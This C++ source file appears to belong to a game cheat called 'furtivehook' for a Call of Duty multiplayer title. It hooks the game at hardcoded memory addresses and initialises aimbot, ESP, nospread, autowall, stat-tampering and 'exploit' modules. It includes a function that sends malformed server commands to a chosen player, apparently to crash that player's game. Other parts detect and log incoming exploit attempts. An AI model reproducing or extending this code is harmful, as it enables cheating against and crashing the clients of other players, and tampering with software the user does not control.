#include "dependencies/std_include.hpp"
#include "game.hpp"

namespace game
{
	std::unordered_map<std::string, bool> handlers; 
	std::array<std::uint32_t, static_cast<std::size_t>(shader::num_shaders)> shaders;
	std::array<scr_string_t, static_cast<std::size_t>(bone_tag::num_tags)> bone_tags;
	game::PartyData_s* party = nullptr;
	dvar_t* cl_maxpackets = nullptr;
	dvar_t* validate_drop_on_fail = nullptr;
	dvar_t* perk_bullet_penetration_multiplier = nullptr;
	
	void initialize()
	{
		for (size_t i = 0; i < 2; ++i)
		{
			handlers[user_groups_handler[i].string];
			handlers[p2p_auth_manager_handler[i].string] = true;
		}

		handlers["echo"];
		handlers["print"];
		handlers["rcon"];
		handlers["SP"];
		handlers["coopConnect"];
		handlers["kickedfromparty"];
		handlers["kickedfromlobby"];

		shaders[static_cast<std::size_t>(shader::white)] = RegisterShader("white");
		shaders[static_cast<std::size_t>(shader::lagometer)] = RegisterShader("lagometer");

		bone_tags[static_cast<std::size_t>(bone_tag::helmet)] = GScr_AllocString("j_helmet");
		bone_tags[static_cast<std::size_t>(bone_tag::head_end)] = GScr_AllocString("j_head_end");
		bone_tags[static_cast<std::size_t>(bone_tag::head)] = GScr_AllocString("j_head");
		bone_tags[static_cast<std::size_t>(bone_tag::neck)] = GScr_AllocString("j_neck");
		bone_tags[static_cast<std::size_t>(bone_tag::shoulder_left)] = GScr_AllocString("j_shoulder_le");
		bone_tags[static_cast<std::size_t>(bone_tag::shoulder_right)] = GScr_AllocString("j_shoulder_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::clavicle_left)] = GScr_AllocString("j_clavicle_le");
		bone_tags[static_cast<std::size_t>(bone_tag::clavicle_right)] = GScr_AllocString("j_clavicle_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::spineupper)] = GScr_AllocString("j_spineupper");
		bone_tags[static_cast<std::size_t>(bone_tag::spine)] = GScr_AllocString("j_spine4");
		bone_tags[static_cast<std::size_t>(bone_tag::spinelower)] = GScr_AllocString("j_spinelower");
		bone_tags[static_cast<std::size_t>(bone_tag::hip_left)] = GScr_AllocString("j_hip_le");
		bone_tags[static_cast<std::size_t>(bone_tag::hip_right)] = GScr_AllocString("j_hip_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::knee_left)] = GScr_AllocString("j_knee_le");
		bone_tags[static_cast<std::size_t>(bone_tag::knee_right)] = GScr_AllocString("j_knee_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::wrist_left)] = GScr_AllocString("j_wrist_le");
		bone_tags[static_cast<std::size_t>(bone_tag::wrist_right)] = GScr_AllocString("j_wrist_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::wrist_twist_left)] = GScr_AllocString("j_wristtwist_le");
		bone_tags[static_cast<std::size_t>(bone_tag::wrist_twist_right)] = GScr_AllocString("j_wristtwist_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::elbow_left)] = GScr_AllocString("j_elbow_le");
		bone_tags[static_cast<std::size_t>(bone_tag::elbow_right)] = GScr_AllocString("j_elbow_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::elbow_buldge_left)] = GScr_AllocString("j_elbow_bulge_le");
		bone_tags[static_cast<std::size_t>(bone_tag::elbow_buldge_right)] = GScr_AllocString("j_elbow_bulge_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::ankle_left)] = GScr_AllocString("j_ankle_le");
		bone_tags[static_cast<std::size_t>(bone_tag::ankle_right)] = GScr_AllocString("j_ankle_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::ball_left)] = GScr_AllocString("j_ball_le");
		bone_tags[static_cast<std::size_t>(bone_tag::ball_right)] = GScr_AllocString("j_ball_ri");
		bone_tags[static_cast<std::size_t>(bone_tag::mainroot)] = GScr_AllocString("j_mainroot");

		cl_maxpackets = game::Dvar_FindVar("cl_maxpackets");
		validate_drop_on_fail = game::Dvar_FindVar("validate_drop_on_fail");
		perk_bullet_penetration_multiplier = *reinterpret_cast<dvar_t**>(0x08DF7B0);
		
		game::Dvar_FindVar("ping_default_min")->current.integer = 500;
		game::Dvar_FindVar("cg_scoreboardPingText")->current.enabled = true;
		game::Dvar_FindVar("com_maxfps")->current.integer = 90;

		security::initialize();
		network::initialize();
		bots::initialize();
		exception::initialize();
		rendering::initialize();
		esp::chams::initialize();
		exploit::initialize();
		lagometer::initialize();
		events::initialize();
		server_command::initialize();
		command::initialize();
		scheduler::async();
		host::initialize();
		autowall::initialize();
		nospread::initialize();
		session::initialize();
		steam::initialize();

		std::srand(std::uint32_t(std::time(nullptr)));

		PRINT_LOG("Initialized!");
	}

	bool AimTarget_GetTagPos(const game::centity_t* cent, const scr_string_t& tag_name, Vec3* end)
	{
		if (const auto dobj = game::Com_GetClientDObj(cent->next_state().number); dobj)
		{
			return CG_DObjGetWorldTagPos(cent, dobj, tag_name, end);
		}

		return false;
	}
	
	bool is_valid_target(const size_t client_num)
	{
		return CL_IsLocalClientInGame() ? game::cg()->client(client_num)->valid() : game::user_is_registered(game::party, client_num);
	}

	int CL_GetLocalClientConnectionState(/*LocalClientNum_t localClientNum*/) {
		return *reinterpret_cast<int*>(0x0010625F4);
	}

	int CL_GetLocalClientMigrationState(/*LocalClientNum_t localClientNum*/) {
		return *reinterpret_cast<int*>(0x00106259C);
	}

	void adjust_user_cmd_moves(game::usercmd_s* cmd, const float angle, const float old_angle, const float old_forward_move, const float old_right_move)
	{
		const auto delta_view = DEG2RAD(angle - old_angle);

		cmd->forwardmove = game::ClampChar(static_cast<int>(cosf(delta_view) * old_forward_move - sinf(delta_view) * old_right_move));
		cmd->rightmove = game::ClampChar(static_cast<int>(sinf(delta_view) * old_forward_move + cosf(delta_view) * old_right_move));
	}
	
	int Party_FindMemberByXUID(const std::uint64_t player)
	{
		if (party)
			return reinterpret_cast<int(*)(PartyData_s*, const std::uint64_t)>(0x004A2770)(party, player);

		return -1;
	}

	int get_held_weapon_slot(game::playerState_s* ps, std::uint32_t weapon)
	{
		for (auto slot = 0u; slot < 15u; ++slot)
		{
			if (weapon == ps->held_weapons(slot))
			{
				return slot;
			}
		}
		
		return -1;
	}

	bool user_is_registered(game::PartyData_s* party, size_t client)
	{
		return party->partyMembers[client].status >= 5;
	}

	bool CG_WorldPosToScreenPos(const Vec3* world_pos, Vec2* out_pos)
	{
		return reinterpret_cast<bool(__cdecl*)(LocalClientNum_t, void*, const Vec3* worldPos, Vec2* outScreenPos)>(0x0044ADC0)(0, reinterpret_cast<void*(__cdecl*)()>(0x004B7610)(), world_pos, out_pos);
	}

	bool NET_CompareXNAddr(const XNADDR *a1, const XNADDR *a2)
	{
		return !std::memcmp(a1, a2, sizeof game::XNADDR);
	}

	bool is_enemy(size_t client_num)
	{
		if (cg()->client(client_num)->team() == TEAM_FREE)
		{
			return true;
		}

		return cg()->client(client_num)->team() != cg()->client(cg()->number())->team();
	}

	bool has_alt_weapon(Weapon weapon)
	{
		return game::BG_GetAltWeapon(weapon) > 0;
	}
	
	int find_target_from_addr(PartyData_s *party, const netadr_t& from)
	{
		if (const auto client_num = Party_FindMember(party, from); client_num >= 0)
		{
			return client_num;
		}

		for (size_t i = 0; i < 18; i++)
		{
			game::XNADDR adr = {};
			if (game::dwNetadrToCommonAddr(from, &adr, sizeof game::XNADDR, 0))
			{
				auto xnaddr = game::party->partyMembers[i].xnaddr;

				if (NET_CompareXNAddr(&xnaddr, &adr))
				{
					return i;
				}
			}
		}

		return -1;
	}

	void on_every_frame()
	{
		aimbot::run(game::cg()->ps());
		esp::visuals();
	}

	void send_server_command_crashes(const int index)
	{
		send_server_command(index, "a -1234567");
		send_server_command(index, "w -1234567");
		send_server_command(index, "H -1234567 -1234567");
		send_server_command(index, "Y -1234567890");
		send_server_command(index, "b 1 0 0 0 -1234567");
		send_server_command(index, "m -123456789 0 0 0 0");
		send_server_command(index, "W -123456789 -1234567 -1234567");
		send_server_command(index, "x -12345678 -1234567");
		send_server_command(index, "y -1234567 -1234567 -1234567");
		send_server_command(index, "z -1234567 -1234567");
	}

	void CG_AddLagometerFrameInfo(game::lagometer_t& lagometer)
	{
		lagometer.frameSamples[++lagometer.frameCount & (LAG_SAMPLES - 1)] = game::cg()->time() - game::cg()->latest_snapshot_time();
	}

	void CG_AddLagometerSnapshotInfo(game::lagometer_t& lagometer, const game::snapshot_s* snap)
	{
		if (!snap)
		{
			lagometer.snapshotSamples[lagometer.snapshotCount & (LAG_SAMPLES - 1)] = -1;
			++lagometer.snapshotCount;
			return;
		}

		lagometer.snapshotSamples[lagometer.snapshotCount & (LAG_SAMPLES - 1)] = snap->ping();
		lagometer.snapshotFlags[lagometer.snapshotCount & (LAG_SAMPLES - 1)] = snap->snap_flags();
		++lagometer.snapshotCount;
	}

	bool is_packet_from_host(const netadr_t& from)
	{
		return NET_CompareAdr(party->currentHost.adr, from);
	}

	bool send_exploit_caught_messages(const std::string& command, const netadr_t& target)
	{
		if (const auto client_num = find_target_from_addr(party, target); client_num >= 0)
		{
			auto pm = party->partyMembers[client_num];

			game::netadr_t adr = {};
			game::dwCommonAddrToNetadr(&adr, &pm.xnaddr, reinterpret_cast<void*>((reinterpret_cast<int>(game::party->session()) + 9)));

			PRINT_LOG("Exploit attempt caught! [%s] from '%s' (%llu) (%u.%u.%u.%u:%u)",
				command.data(),
				pm.gamertag,
				pm.player,
				pm.xnaddr.ip[0],
				pm.xnaddr.ip[1],
				pm.xnaddr.ip[2],
				pm.xnaddr.ip[3],
				adr.port);
		}
		else
		{
			game::XNADDR adr = {};
			if (game::dwNetadrToCommonAddr(target, &adr, sizeof game::XNADDR, 0))
			{
				PRINT_LOG("Exploit attempt caught! [%s] from (%u.%u.%u.%u:%u)",
					command.data(),
					adr.ip[0],
					adr.ip[1],
					adr.ip[2],
					adr.ip[3],
					target.port);
			}
		}

		PRINT_BOLD_MESSAGE("Exploit attempt caught!");

		return true;
	}

	bool send_unhandled_message(const std::string& command, const netadr_t& target)
	{
		if (const auto client_num = find_target_from_addr(party, target); client_num >= 0)
		{
			auto pm = party->partyMembers[client_num];

			game::netadr_t adr = {};
			game::dwCommonAddrToNetadr(&adr, &pm.xnaddr, reinterpret_cast<void*>((reinterpret_cast<int>(game::party->session()) + 9)));
			
			PRINT_LOG("Received unhandled [%s] message from '%s' (%llu) (%u.%u.%u.%u:%u)",
				command.data(),
				pm.gamertag,
				pm.player,
				pm.xnaddr.ip[0],
				pm.xnaddr.ip[1],
				pm.xnaddr.ip[2],
				pm.xnaddr.ip[3],
				adr.port);
		}
		else
		{
			game::XNADDR adr = {};
			if (game::dwNetadrToCommonAddr(target, &adr, sizeof game::XNADDR, 0))
			{
				PRINT_LOG("Received unhandled [%s] message from (%u.%u.%u.%u:%u)",
					command.data(),
					adr.ip[0],
					adr.ip[1],
					adr.ip[2],
					adr.ip[3],
					target.port);
			}
		}

		return true;
	}
	
	std::string get_oob_command(const game::netadr_t& target)
	{
		if (const auto client_num = game::Party_FindMember(game::party, target); client_num >= 0)
		{
			auto pm = game::party->partyMembers[client_num];

			game::netadr_t adr = {};
			game::dwCommonAddrToNetadr(&adr, &pm.xnaddr, reinterpret_cast<void*>((reinterpret_cast<int>(game::party->session()) + 9)));

			return utils::string::va("Received OOB '%s' from '%s' (%llu): %u.%u.%u.%u:%u",
				command::params.join(0).data(),
				pm.gamertag,
				pm.player,
				pm.xnaddr.ip[0],
				pm.xnaddr.ip[1],
				pm.xnaddr.ip[2],
				pm.xnaddr.ip[3],
				adr.port);
		}
		else
		{
			game::XNADDR adr = {};
			if (game::dwNetadrToCommonAddr(target, &adr, sizeof game::XNADDR, 0))
			{
				return utils::string::va("Received OOB '%s' from (%u.%u.%u.%u:%u)",
					command::params.join(0).data(),
					adr.ip[0],
					adr.ip[1],
					adr.ip[2],
					adr.ip[3],
					target.port);
			}
		}

		return {};
	}

	bool is_hosting()
	{
		if(party)
			return game::Party_IsHosting(party, game::Party_FindMemberByXUID(Live_GetXuid(0)));

		return false;
	}

	void cycling_prestige()
	{
		if (!CL_GetLocalClientConnectionState())
		{
			if (misc::cycling_prestige)
			{
				static auto prestige = 0u;
				if (++prestige > 21)
				{
					prestige = 0;
				}

				stats::set_prestige(prestige);
			}
		}
	}

	void Scr_SetNumParam(size_t count)
	{
		utils::hook::set<std::uint8_t>(0x0020B4A98, count);
	}

	void make_dvar_server_info(const std::string& name, const std::string& value)
	{
		const auto dvar = Dvar_SetFromStringByNameFromSource(name.data(), value.data(), 2);
		if (dvar->flags & 0x10)
		{
			return;
		}
		
		Dvar_AddFlags(dvar, 0x10);
	}

	float get_weapon_damage_range(const Weapon& weapon, const playerState_s* ps)
	{
		const auto perks = game::cg()->client(ps->number())->perks;
		const auto has_alt = has_alt_weapon(weapon);
		
		float min_damage_range, max_damage_range; 
		BG_GetPlayerDamageRange(perks, weapon, has_alt, &min_damage_range, &max_damage_range);

		if (BG_WeaponBulletFire_ShouldSpread(perks, weapon, has_alt))
		{
			return std::fmax(min_damage_range, max_damage_range);
		}

		return 8192.0f;
	}

	float BG_GetLocationDamageMultipliers(const Weapon& weapon, const std::uint16_t hit_location)
	{
		return *reinterpret_cast<float*>(reinterpret_cast<int(*)(Weapon, bool)>(0x00432D00)(weapon, game::has_alt_weapon(weapon)) + 4 * hit_location);
	}

	int Bullet_GetDamage(const game::BulletTraceResults& br, const game::BulletFireParams& bp, const game::centity_t* cent, const Weapon& weapon, const Weapon& alt)
	{
		const auto damage = game::BG_GetDamage(weapon, alt);
		const auto min_damage = game::BG_GetMinDamage(weapon, alt);
		auto final_damage = damage;

		if (damage != min_damage)
		{
			float min_damage_range, max_damage_range;
			game::BG_GetPlayerDamageRange(game::cg()->client(cent->next_state().number)->perks, weapon, game::has_alt_weapon(weapon), &min_damage_range, &max_damage_range);

			const auto dist = br.hitPos.distance(bp.origStart);
			if (max_damage_range > dist)
				return static_cast<int>(bp.damageMultiplier * damage);

			if (min_damage_range > dist)
			{
				const auto bpd = (dist - max_damage_range) / (min_damage_range - max_damage_range);
				const auto bpe = bpd * min_damage + (1.0f - bpd) * damage;

				return static_cast<int>(bp.damageMultiplier * static_cast<float>(static_cast<int>(bpe)));
			}

			final_damage = min_damage;
		}

		return static_cast<int>(bp.damageMultiplier * final_damage);
	}

	void set_map(const std::string& map)
	{
		Dvar_SetStringByName("ui_mapname", map.data());
		Cbuf_AddCall(0, UI_Map);
	}

	void CG_BulletEndpos(std::uint32_t* randSeed, const float spread, Vec3 *start, Vec3 *end, Vec3 *dir, Vec3 *forwardDir, Vec3 *rightDir, Vec3 *upDir, const float maxRange)
	{
		static constexpr auto address = 0x0047C8B0;

		__asm
		{
			mov ebx, start;
			mov edi, end;
			mov esi, randSeed;
			push maxRange;
			push upDir;
			push rightDir;
			push forwardDir;
			push dir;
			push spread;

			call address;

			add esp, 6 * 4;
		}
	}

	void CG_BulletEndpos(std::uint32_t* randSeed, const float spread, Vec3 *dir, Vec3 *forwardDir, Vec3 *rightDir, Vec3 *upDir, const float maxRange)
	{
		Vec3 start, end;
		CG_BulletEndpos(randSeed, spread, &start, &end, dir, forwardDir, rightDir, upDir, maxRange);
	}

	std::uint64_t StringToInt64(const std::string& string)
	{
		static auto value = 0ll;

		if (!string.empty())
			std::sscanf(string.data(), "%8x%8x", &value, reinterpret_cast<char*>(&value) + 4);

		return value;
	}

	std::string CL_AddMessageIcon(const std::string& name, const Vec2& dimensions, const bool flip_icon)
	{
		auto string = "^"s;

		string += (flip_icon ? 2 : 1);
		string += CL_DeathMessageIconDimension(dimensions.x);
		string += CL_DeathMessageIconDimension(dimensions.y);
		string += name.length();
		string += name;

		return string;
	}

	int I_stricmp(const std::string& a, const std::string& b)
	{
		const static auto I_stricmp = reinterpret_cast<int(*)(const char*, const char*)>(0x005C2A80);
		return I_stricmp(a.data(), b.data());
	}

	std::vector<std::uint32_t> party_ids()
	{
		std::vector<std::uint32_t> party_ids;

		for (size_t i = 0; i <= 2; ++i)
		{
			party_ids.emplace_back(i);
		}

		return party_ids;
	}

	std::string get_client_name(const game::PartyMember* pm, const size_t index)
	{
		char player_name[42] = {};
		CL_GetClientName(0, index, player_name, sizeof player_name);

		if (party == g_partyData)
		{
			game::I_strncpyz(player_name, pm->gamertag, sizeof player_name);
			return player_name;
		}

		return player_name;
	}

	void game_message(const std::string& msg)
	{
		game::CG_GameMessage(0, msg.data());
	}

	void bold_game_message(const std::string& msg)
	{
		game::CG_BoldGameMessage(0, ("[furtivehook] " + msg).data());
	}

	void send_server_command(const int client_num, const std::string& command)
	{
		if (client_num >= -1 && client_num < 18)
		{
			if (game::is_hosting())
				game::SV_GameSendServerCommand(client_num, SV_CMD_RELIABLE, command.data());
			else
				exploit::member_join::send_payload("sv", { std::to_string(client_num), command });
		}
	}

	void enum_assets(const XAssetType type, const std::function<void(void*)>& callback, const bool includeOverride)
	{
		DB_EnumXAssets_Internal(type, static_cast<void(*)(void*, void*)>([](void* header, void* data)
		{
			const auto& cb = *static_cast<const std::function<void(void*)>*>(data);
			cb(header);
		}), &callback, includeOverride);
	}

	game::Material* get_material(const char* material_ptr, const int length)
	{
		if (length < 0 || length > 255)
			return nullptr;

		if (std::strlen(material_ptr) >= length)
			return game::Material_Register(material_ptr);

		return nullptr;
	}

	int Playlist_GetCurrentId()
	{
		return *reinterpret_cast<int*>(0x0106253C);
	}

	bool is_valid_cod_info_dvar(const std::string& dvar_name)
	{
		if (utils::string::contains(dvar_name, "cg_score")
			|| utils::string::contains(dvar_name, "cg_fov")
			|| utils::string::contains(dvar_name, "crosshair")
			|| utils::string::contains(dvar_name, "thirdperson")
			|| utils::string::contains(dvar_name, "timescale")
			|| utils::string::contains(dvar_name, "radius")
			|| utils::string::contains(dvar_name, "pdc")
			|| utils::string::contains(dvar_name, "aci")
			|| utils::string::begins_with(dvar_name, "com_")
			|| utils::string::begins_with(dvar_name, "fs_")
			|| utils::string::begins_with(dvar_name, "r_")
			|| utils::string::begins_with(dvar_name, "snd_")
			|| utils::string::begins_with(dvar_name, "player_")
			|| utils::string::begins_with(dvar_name, "validate_")
			|| utils::string::begins_with(dvar_name, "dw_")
			|| utils::string::begins_with(dvar_name, "matchdata_"))
		{
			return false;
		}

		return true;
	}

	bool is_preparing_migration(const size_t index, const char* game_end_time)
	{
		if (index == 5 || index == 6)
		{
			return true;
		}
		
		if (index == 15)
		{
			if (utils::atoi(game_end_time) == 0)
			{
				return true;
			}
		}

		return false;
	}
	
	bool is_valid_map_name(const std::string& map)
	{
		for (const auto& map_name : menu::map_names)
		{
			if (map_name.first == map)
				return true;
		}

		return false;
	}
	
	bool is_valid_new_server_map_info(msg_t& msg)
	{
		char message[1024] = { 0 };
		char map_name_str[64] = { 0 };

		const auto map_name = game::MSG_ReadStringLine(&msg, message, sizeof message);
		game::I_strncpyz(map_name_str, map_name, sizeof map_name_str);
		const auto game_type = game::MSG_ReadStringLine(&msg, message, sizeof message);

		if (*map_name_str && *game_type)
		{
			if (is_valid_map_name(map_name_str) && Scr_IsValidGameType(game_type))
				return true;
		}

		PRINT_LOG_DETAILED("%s %s", map_name_str, game_type);
		return false;
	}

	bool is_valid_relay_packet(const command::params_& args, const netadr_t& target, msg_t& msg)
	{
		const auto length = msg.cursize - msg.readcount; 
		if (length >= 0 && length < 1024)
		{
			char packet[1024] = { 0 };
			MSG_ReadData(&msg, packet, length);

			if (!utils::string::begins_with(packet + 1, "nominee")
				&& !utils::string::begins_with(packet + 1, "migrateto")
				&& !utils::string::begins_with(packet + 1, "bandtest")
				&& !utils::string::begins_with(packet + 1, "bandres")
				&& !utils::string::begins_with(packet + 1, "nomigrate")
				&& !utils::string::begins_with(packet + 1, "makehosttest")
				&& !utils::string::begins_with(packet + 1, "ug_groups_confirmed"))
			{
				const auto command = utils::string::va("%s %s", args.join(0).data(), packet);
				return send_unhandled_message(command, target);
			}
		}

		return false;
	}

	bool LiveStorage_DataSetInternalString(const int index, char const* const* args, const std::string& value, StructuredDataBuffer* persistent_data, uint8_t* modified_flags)
	{
		int last_index{ 0 };
		StructuredDataLookup lookup{};

		const auto asset = StructuredDataDef_GetAsset("mp/playerdata.def", 0x2FFC);
		StructuredData_InitializeLookup(asset, &lookup);

		if (StructuredData_NavigateByStrings(&lookup, args, index, &last_index))
		{
			if (last_index != index)
			{
				PRINT_LOG("Error setting persistent data: incorrect number of arguments.");
				return false;
			}

			const auto result = LiveStorage_SetLookedUpDataFromString(&lookup, reinterpret_cast<StructuredDataBuffer*>(&persistent_data), modified_flags, value.data());

			if (result && result != 1)
			{
				PRINT_LOG("Error setting persistent data");
				return false;
			}

			return true;
		}
		else
		{
			PRINT_LOG("Error setting persistent data.");
		}

		return false;
	}

	const StringTable* get_string_table(const std::string& asset)
	{
		const StringTable* table{ nullptr };
		StringTable_GetAsset(asset.data(), &table);
		return table;
	}
}